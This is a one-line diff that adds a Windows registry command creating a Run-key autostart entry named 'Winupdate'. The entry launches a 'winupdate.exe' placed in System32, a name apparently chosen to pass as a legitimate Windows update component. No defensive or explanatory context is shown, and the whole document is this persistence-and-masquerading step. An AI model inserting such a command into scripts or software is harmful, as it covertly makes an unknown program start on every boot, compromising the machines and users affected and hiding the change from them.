@@ -1,0 +1,1 @@
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Winupdate /t REG_SZ /d "C:\Windows\System32\winupdate.exe"
